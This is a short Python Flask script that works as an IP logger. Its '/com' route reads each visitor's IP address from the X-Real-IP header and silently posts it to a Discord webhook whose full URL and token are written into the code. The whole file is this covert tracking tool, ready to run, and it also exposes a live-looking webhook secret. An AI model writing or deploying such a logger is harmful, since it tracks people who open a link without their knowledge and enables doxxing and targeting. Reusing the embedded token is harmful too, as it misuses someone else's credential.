from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1552368323839266846/n_cRPiQxepPE70kSOMiV1fIxOtNQ-dHO2eohu9ZB9m3dVkf0IJtRR6vRVmC5Z01z_SSE"

@app.route('/com')
def executer_script():
    remote_addr = request.remote_addr
    forwarded_for = request.headers.get("X-Forwarded-For")
    real_ip = request.headers.get("X-Real-IP")

    message = f"Ton IP est : {real_ip}"
    print(message)  # Affiche le message dans la console

    requests.post(
        WEBHOOK_URL,
        json={"content": message}
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)